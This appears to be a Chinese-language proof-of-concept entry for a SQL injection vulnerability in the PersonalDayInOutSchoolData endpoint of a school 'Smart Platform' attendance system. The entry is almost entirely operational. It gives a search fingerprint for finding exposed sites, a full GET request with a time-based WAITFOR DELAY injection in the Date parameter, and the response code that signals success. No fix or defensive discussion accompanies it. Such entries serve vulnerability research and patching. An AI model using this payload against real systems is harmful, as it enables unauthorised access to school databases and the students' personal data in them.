# 智慧平台PersonalDayInOutSchoolData存在SQL注入漏洞

智慧平台 ｜ SQL注入 ｜ —
- **指纹**：`body="custom/blue/uimaker/easyui.css"`
- **请求**：`GET /ashx/APP/InOutSchoolService.ashx?action=PersonalDayInOutSchoolData&Date=1%27%3BWAITFOR+DELAY+%270%3A0%3A5%27--&AccountNo=1 HTTP/1.1`
- **响应特征**：200